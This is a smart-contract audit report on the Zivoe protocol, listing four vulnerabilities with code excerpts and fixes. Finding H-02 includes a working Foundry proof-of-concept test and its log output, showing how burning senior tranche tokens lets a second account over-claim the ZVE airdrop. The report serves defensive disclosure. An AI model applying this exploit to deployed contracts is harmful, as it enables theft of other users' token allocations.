| Severity | Title | 
|:--:|:---|
| [H-01](#h-01-anyone-could-call-depositreward-with-zero-reward-to-extend-the-period-finish-time) | Anyone could call depositReward with zero reward to extend the period finish time |
| [H-02](#h-02-ito-can-be-manipulated) | ITO can be manipulated |
| [M-01](#m-01-ocl_zvepushtolockermulti-will-revert-due-to-incorrect-assert-statements-when-interacting-with-uniswapv2) | OCL_ZVE::pushToLockerMulti() will revert due to incorrect assert() statements when interacting with UniswapV2 |
| [M-02](#m-02-zivoetranchesrewardzvejuniordeposit-function-miscalculates-the-reward-when-the-ratio-traverses-lowerupper-bound) | ZivoeTranches#rewardZVEJuniorDeposit function miscalculates the reward when the ratio traverses lower/upper bound. |


# [H-01] Anyone could call depositReward with zero reward to extend the period finish time
## Summary
Anyone could extend the reward finish time, potentially resulting in users receiving fewer rewards than expected within the same time period.

## Vulnerability Detail
The function depositReward can be called by anyone, even with zero rewards, allowing it to be exploited to extend the reward finish time at little cost.
This could result in loss of rewards; for instance, if there are 10 DAI rewards within a 10-day period, a malicious user could extend the finish time on day 5, extending the finish time to the 15th day. Participants would only receive 7.5 DAI by the 10th day.
```solidity
   function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {
        IERC20(_rewardsToken).safeTransferFrom(_msgSender(), address(this), reward);

        // Update vesting accounting for reward (if existing rewards being distributed, increase proportionally).
        if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {
            rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);
        } else {
            uint256 remaining = rewardData[_rewardsToken].periodFinish.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardData[_rewardsToken].rewardRate);
            rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);
        }

        rewardData[_rewardsToken].lastUpdateTime = block.timestamp;
        rewardData[_rewardsToken].periodFinish = block.timestamp.add(rewardData[_rewardsToken].rewardsDuration);
        emit RewardDeposited(_rewardsToken, reward, _msgSender());
    }
```

## Impact
Anyonce could extend the reward finish time and the users may receive less rewards than expected during the same time period.

## Code Snippet
https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewards.sol#L228-L243

## Tool used
Manual Review

## Recommendation
Only specific users are allowed to call function depositReward

# [H-02] ITO can be manipulated
## Summary
The ITO allocates 3 pZVE tokens per senior token minted and 1 pZVE token per junior token minted. When the offering period ends, users can claim the protocol ZVE token depending on the share of all pZVE they hold. Only 5% of the total ZVE tokens will be distributed to users, which is equal to 1.25M tokens.

The ITO can be manipulated because it uses totalSupply() in its calculations.

## Vulnerability Detail
ZivoeITO.claimAirdrop() calculates the amount of ZVE tokens that should be vested to a certain user. It then creates a vesting schedule and sends all junior and senior tokens to their recipient.

The formula is 
 (in the code these are called upper, middle and lower).
```solidity
        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;
        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (
            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()
        );
```
These calculations can be manipulated because they use totalSupply(). The tranche tokens have a public burn() function.

An attacker can use 2 accounts to enter the ITO. They will deposit large amounts of stablecoins towards the senior tranche. When the airdrop starts, they can claim their senior tokens and start vesting ZVE tokens. The senior tokens can then be burned. Now, when the attacker calls the claimAirdrop function with their second account, the denominator of the above equation will be much smaller, allowing them to claim much more ZVE tokens than they are entitled to.

## Impact
There are 2 impacts from exploiting this vulnerability:

a malicious entity can claim excessively large part of the airdrop and gain governance power in the protocol
since the attacker would have gained unexpectedly large amount of ZVE tokens and the total ZVE to be distributed will be 1.25M, the users that claim after the attacker may not be able to do so if the amount they are entitled to, added to the stolen ZVE, exceeds 1.25M.

## Code Snippet
Add this function to Test_ZivoeITO.sol and import the console.

You can comment the line where Sue burns their tokens and see the differences in the logs.
```solidity
    function test_StealZVE() public {
        // Sam is an honest actor, while Bob is a malicious one
        mint("DAI", address(sam), 3_000_000 ether);
        mint("DAI", address(bob), 2_000_000 ether);
        zvl.try_commence(address(ITO));

        // Bob has another Ethereum account, Sue
        bob.try_transferToken(DAI, address(sue), 1_000_000 ether);
        
        // give approvals
        assert(sam.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(bob.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(sue.try_approveToken(DAI, address(ITO), type(uint256).max));

        // Sam deposits 2M DAI to senior tranche and 400k to the junior one
        hevm.prank(address(sam));
        ITO.depositBoth(2_000_000 ether, DAI, 400_000, DAI);
       
        // Bob deposits 2M DAI into the senior tranche using his both accounts
        hevm.prank(address(bob));
        ITO.depositSenior(1_000_000 ether, DAI);

        hevm.prank(address(sue));
        ITO.depositSenior(1_000_000 ether, DAI);

        // Move the timestamp after the end of the ITO
        hevm.warp(block.timestamp + 31 days);
        
        ITO.claimAirdrop(address(sue));
        (, , , uint256 totalVesting, , , ) = vestZVE.viewSchedule(address(sue));

        // Sue burn all senior tokens
        vm.prank(address(sue));
        zSTT.burn(1_000_000 ether);

        console.log('Sue vesting: ', totalVesting / 1e18);

        ITO.claimAirdrop(address(bob));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(bob));

        console.log('Bob vesting: ', totalVesting / 1e18);

        ITO.claimAirdrop(address(sam));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(sam));

        console.log('Sam vesting: ', totalVesting / 1e18);
    }
```solidity
Fair vesting without prior burning

  Sue vesting:  312499
  Bob vesting:  312499
  Sam vesting:  625001
Vesting after burning

  Sue vesting:  312499
  Bob vesting:  416666
  Sam vesting:  833333
Bob and Sue will be able to claim ~750 000 ZVE tokens and Sam will not be able to claim any, because the total exceeds 1.25M.

## Tool used
Manual Review

## Recommendation
Introduce a few new variables in the ITO contract.
```solidity
   bool hasAirdropped;
   uint256 totalZVE;
   uint256 totalzSTT; 
   uint256 totalzJTT;
```
Then check if the call to claimAidrop is a first one and if it is, initialize the variables. Use these variables in the vesting calculations.
```solidity
    function claimAirdrop(address depositor) external returns (
        uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested
    ) {
            ...
            if (!hasAirdropped) {
                  totalZVE = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply();
                  totalzSTT = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply();
                  totalzJTT = IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply();
                  hasAirdropped = true;
            }
            ...

           uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
           uint256 middle = totalZVE / 20;
           uint256 lower = totalzSTT * 3 + totalzJTT;
      }
```

# [M-01] OCL_ZVE::pushToLockerMulti() will revert due to incorrect assert() statements when interacting with UniswapV2
## Summary
OCL_ZVE::pushToLockerMulti() verifies that the allowances for both tokens is 0 after providing liquidity to UniswapV2 or Sushi routers, however there is a high likelihood that one allowance will not be 0, due to setting a 90% minimum liquidity provided value. Therefore, the function will revert most of the time breaking core functionality of the locker, making the contract useless.

## Vulnerability Detail
The DAO can add liquidity to UniswapV2 or Sushi through OCL_ZVE::pushToLockerMulti() function, where addLiquidity is called on router:

OCL_ZVE.sol#L198C78-L198
```solidity
IRouter_OCL_ZVE(router).addLiquidity(
```
OCL_ZVE.sol#L90
```solidity
address public immutable router;            /// @dev Address for the Router (Uniswap v2 or Sushi).
```
The router is intended to be Uniswap v2 or Sushi (Sushi router uses the same code as Uniswap v2 0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f).

UniswapV2Router02::addLiquidity
```solidity
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {
        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);
        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);
        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);
        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);
        liquidity = IUniswapV2Pair(pair).mint(to);
    }
```
When calling the function 4 variables relevant to this issue are passed:
amountADesired and amountBDesired are the ideal amount of tokens we want to deposit, whilst
amountAMin and amountBMin are the minimum amounts of tokens we want to deposit.
Meaning the true amount that will deposit be deposited for each token will be inbetween those 2 values, e.g:
amountAMin <= amountA <= amountADesired.
Where amountA is how much of tokenA will be transfered.

The transfered amount are amountA and amountB which are calculated as follows:
UniswapV2Router02::_addLiquidity
```solidity
    function _addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin
    ) internal virtual returns (uint amountA, uint amountB) {
        // create the pair if it doesn't exist yet
        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {
            IUniswapV2Factory(factory).createPair(tokenA, tokenB);
        }
        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);
        if (reserveA == 0 && reserveB == 0) {
            (amountA, amountB) = (amountADesired, amountBDesired);
        } else {
            uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);
            if (amountBOptimal <= amountBDesired) {
                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');
                (amountA, amountB) = (amountADesired, amountBOptimal);
            } else {
                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);
                assert(amountAOptimal <= amountADesired);
                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');
                (amountA, amountB) = (amountAOptimal, amountBDesired);
            }
        }
    }
```
UniswapV2Router02::_addLiquidity receives a quote for how much of each token can be added and validates that the values fall within the amountAMin and amountADesired range. Unless the exactly correct amounts are passed as amountADesired and amountBDesired then the amount of one of the two tokens will be less than the desired amount.

Now lets look at how OCL_ZVE interacts with the Uniswapv2 router:

OCL_ZVE::addLiquidity
```solidity
        // Router addLiquidity() endpoint.
        uint balPairAsset = IERC20(pairAsset).balanceOf(address(this));
        uint balZVE = IERC20(ZVE).balanceOf(address(this));
        IERC20(pairAsset).safeIncreaseAllowance(router, balPairAsset);
        IERC20(ZVE).safeIncreaseAllowance(router, balZVE);

        // Prevent volatility of greater than 10% in pool relative to amounts present.
        (uint256 depositedPairAsset, uint256 depositedZVE, uint256 minted) = IRouter_OCL_ZVE(router).addLiquidity(
            pairAsset, 
            ZVE, 
            balPairAsset,
            balZVE, 
            (balPairAsset * 9) / 10,
            (balZVE * 9) / 10, 
            address(this), block.timestamp + 14 days
        );
        emit LiquidityTokensMinted(minted, depositedZVE, depositedPairAsset);
        assert(IERC20(pairAsset).allowance(address(this), router) == 0);
        assert(IERC20(ZVE).allowance(address(this), router) == 0);
```
The function first increases the allowances for both tokens to balPairAsset and balZVE respectively.

When calling the router, balPairAsset and valZVE are provided as the desired amount of liquidity to add, however (balPairAsset * 9) / 10 and (balZVE * 9) / 10 are also passed as minimums for how much liquidity we want to add.

As the final transfered value will be between:
(balPairAsset * 9) / 10 <= x <= balPairAsset
therefore the allowance after providing liquidity will be:
0 <= IERC20(pairAsset).allowance(address(this), router) <= balPairAsset - (balPairAsset * 9) / 10
however the function expects the allowance to be 0 for both tokens after providing liquidity.
The same applies to the ZVE allowance.

This means that in most cases one of the assert statements will not be met, leading to the add liquidity call to revert. This is unintended behaviour, as the function passed a 90% minimum amount, however the allowance asserts do not take this into consideration.

## Impact
Calls to OCL_ZVE::pushToLockerMulti() will revert a majority of the time, causing core functionality of providing liquidity through the locker to be broken.

## Code Snippet
OCL_ZVE.sol#L198C78-L198
UniswapV2Router02.sol#L61-L76
UniswapV2Router02.sol#L33-L60
OCL_ZVE.sol#L191-L209

## Tool used
Manual Review

## Recommendation
The project wants to clear allowances after all transfers, therefore set the router allowance to 0 after providing liquidity using the returned value from the router:
```solidity
  (uint256 depositedPairAsset, uint256 depositedZVE, uint256 minted) = IRouter_OCL_ZVE(router).addLiquidity(
      pairAsset, 
      ZVE, 
      balPairAsset,
      balZVE, 
      (balPairAsset * 9) / 10,
      (balZVE * 9) / 10, 
      address(this), block.timestamp + 14 days
  );
  emit LiquidityTokensMinted(minted, depositedZVE, depositedPairAsset);
- assert(IERC20(pairAsset).allowance(address(this), router) == 0);
- assert(IERC20(ZVE).allowance(address(this), router) == 0);
+ uint256 pairAssetAllowanceLeft = balPairAsset - depositedPairAsset;
+ if (pairAssetAllowanceLeft > 0) {
+     IERC20(pairAsset).safeDecreaseAllowance(router, pairAssetAllowanceLeft);
+ }
+ uint256 zveAllowanceLeft = balZVE - depositedZVE;
+ if (zveAllowanceLeft > 0) {
+     IERC20(ZVE).safeDecreaseAllowance(router, zveAllowanceLeft);
+ }
```
This will remove the left over allowance after providing liquidity, ensuring the allowance is 0.

# [M-02] ZivoeTranches#rewardZVEJuniorDeposit function miscalculates the reward when the ratio traverses lower/upper bound.
## Summary
ZivoeTranches#rewardZVEJuniorDeposit function miscalculates the reward when the ratio traverses lower/upper bound.
The same issue also exists in the ZivoeTranches#rewardZVESeniorDeposit function.

## Vulnerability Detail
ZivoeTranches#rewardZVEJuniorDeposit function is the following.
```solidity
    function rewardZVEJuniorDeposit(uint256 deposit) public view returns (uint256 reward) {

        (uint256 seniorSupp, uint256 juniorSupp) = IZivoeGlobals_ZivoeTranches(GBL).adjustedSupplies();

        uint256 avgRate;    // The avg ZVE per stablecoin deposit reward, used for reward calculation.

        uint256 diffRate = maxZVEPerJTTMint - minZVEPerJTTMint;

        uint256 startRatio = juniorSupp * BIPS / seniorSupp;
        uint256 finalRatio = (juniorSupp + deposit) * BIPS / seniorSupp;
213:    uint256 avgRatio = (startRatio + finalRatio) / 2;

        if (avgRatio <= lowerRatioIncentiveBIPS) {
216:        avgRate = maxZVEPerJTTMint;
        } else if (avgRatio >= upperRatioIncentiveBIPS) {
218:        avgRate = minZVEPerJTTMint;
        } else {
220:        avgRate = maxZVEPerJTTMint - diffRate * (avgRatio - lowerRatioIncentiveBIPS) / (upperRatioIncentiveBIPS - lowerRatioIncentiveBIPS);
        }

223:    reward = avgRate * deposit / 1 ether;

        // Reduce if ZVE balance < reward.
        if (IERC20(IZivoeGlobals_ZivoeTranches(GBL).ZVE()).balanceOf(address(this)) < reward) {
            reward = IERC20(IZivoeGlobals_ZivoeTranches(GBL).ZVE()).balanceOf(address(this));
        }
    }
```
Here, let us assume that lowerRatioIncentiveBIPS = 1000, upperRatioIncentiveBIPS = 2500, minZVEPerJTTMint = 0, maxZVEPerJTTMint = 0.4 * 10 ** 18, seniorSupp = 10000.

Let us consider the case of juniorSupp = 0 where the ratio traverses the lower bound.

Example 1:
Assume that the depositor deposit 2000 at a time.
Then avgRatio = 1000 holds in L213, thus avgRate = maxZVEPerJTTMint = 0.4 * 10 ** 18 holds in L216.
Therefore reward = 0.4 * deposit = 800 holds in L223.

Example 2:
Assume that the depositor deposit 1000 twice.
Then, since avgRate = 500 < lowerRatioIncentiveBIPS holds for the first deposit, avgRate = 0.4 * 10 ** 18 holds in L216, thus reward = 400 holds.
Since avgRate = 1500 > lowerRatioIncentiveBIPS holds for the second deposit, avgRate = 0.3 * 10 ** 18 holds in L220, thus reward = 300 holds.
Finally, the total sum of rewards for two deposits are 400 + 300 = 700.

This shows that the reward of the case where all assets are deposited at a time is larger than the reward of the case where assets are divided and deposited twice. In this case, the protocol gets loss of funds.

Likewise, in the case where the ratio traverses the upper bound, the reward of one time deposit will be smaller than the reward of two times deposit and thus the depositor gets loss.

The same issue also exists in the ZivoeTranches#rewardZVESeniorDeposit function.

## Impact
When the ratio traverses the lower/upper bound in ZivoeTranches#rewardZVEJuniorDeposit and ZivoeTranches#rewardZVESeniorDeposit functions, the amount of reward will be larger/smaller than it should be. Thus the depositor or the protocol will get loss of funds.

## Code Snippet
https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeTranches.sol#L215-L221

## Tool used
Manual Review

## Recommendation
Modify the functions to calculate the reward dividing into two portion when the ratio traverses the lower/upper bound, which is similar to the case of Example 2.